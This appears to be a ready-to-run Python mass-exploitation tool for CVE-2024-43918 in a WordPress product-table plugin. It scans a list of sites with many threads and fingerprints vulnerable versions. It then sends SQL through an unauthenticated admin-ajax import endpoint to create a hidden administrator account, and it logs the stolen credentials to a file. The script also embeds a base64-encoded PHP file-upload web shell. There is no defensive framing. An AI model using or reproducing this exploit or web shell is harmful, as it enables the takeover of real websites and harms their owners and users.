#!/usr/bin/env python3
# -*- coding: utf-8 -*
from re import findall
from base64 import b64encode
from argparse import ArgumentParser
from random import getrandbits
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from requests import Session
__import__('warnings').simplefilter('ignore',Warning)

#i dont do typing in simple python scripts cs am no diddy so dont be diddy use typin only on "big" code (no diddy :D)

class CVE_2024_43918:

    def Save(self, file, data):
        with self.Lock:
            with open(file, 'a') as f:
                f.write(f"{data}\n")

    def Exploit(self, url):
        done = 0 
        user     = f"backup_{getrandbits(10)}"
        password = f"admin$${getrandbits(16)}"
        queries  = [
            f"INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_status, display_name) VALUES ('{user}', MD5('{password}'), '{user}', '{user}@site.com', 0, '{user}')",
            f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = '{user}'), 'wp_capabilities',"+" 'a:1:{s:13:\"administrator\";s:1:\"1\";}')"
        ]
        for query in queries:
            r = self.session.post(f"{url}wp-admin/admin-ajax.php?action=importGroup",
                files={"import_file":('s.sql', query)}).text
            if user not in r:
                print(f" [ LOG ] (NOT EXPLOITABLE) {url}")
                return False
            done += 1
        if done == 2:
            print(f" [ LOG ] (ADMIN ADDED) {url}")
            return self.Save("admin_created.txt", f"{url}@{user}#{password}")

    def Scan(self, url):
        url = f"{'http://' if not url.lower().startswith(('http://', 'https://')) else ''}{url}{'/' if not url.endswith('/') else ''}"
        print(f" [ LOG ] (CHECKING) {url}")
        try:
            r = self.session.get(f"{url}wp-content/plugins/woo-producttables-pro/readme.txt").text
            if 'To upgrade Product Table by WBW plugin' in r and "= 1.9.5 =" not in r:
                print(f" [ LOG ] (VULN) {url}")
                self.Save("__vuln__.txt", url)
                return self.Exploit(url)
            print(f" [ LOG ] (NOT VULN) {url}")
        except:
            print(f" [LOG] EXCEPTION ERROR ({url})")

    def __init__(self, Lock):
        self.Lock  = Lock
        self.shell = b64encode('''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''.encode()).decode()
        self.session = Session()
        self.session.verify  = False
        self.session.timeout = (20,40)
        self.session.allow_redirects = True
        self.session.max_redirects = 5
        self.session.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"})

if __name__ == '__main__':
    print('''


    db   d8b   db d8888b.      d88888b db    db d8888b. 
    88   I8I   88 88  `8D      88'     `8b  d8' 88  `8D 
    88   I8I   88 88oodD'      88ooooo  `8bd8'  88oodD' 
    Y8   I8I   88 88~~~        88~~~~~  .dPYb.  88~~~   
    `8b d8'8b d8' 88           88.     .8P  Y8. 88      
     `8b8' `8d8'  88           Y88888P YP    YP 88      
                                                TG: @KtN_1990

        ''')

    parser = ArgumentParser()
    parser.add_argument('-l', '--list', help="Path of list site", required=True)
    parser.add_argument('-t', '--threads', type=int, help="threads number", default=100)
    args = parser.parse_args()
    try:
        with open(args.list, 'r') as f: urls = list(set(f.read().splitlines()))
        ExpObj = CVE_2024_43918(Lock())
        with ThreadPoolExecutor(max_workers=int(args.threads)) as pool:
            [pool.submit(ExpObj.Scan, url) for url in urls]
    except Exception as e:
        print(e)
        print(" [LOG] EXCEPTION ERROR @ MAIN FUNC")
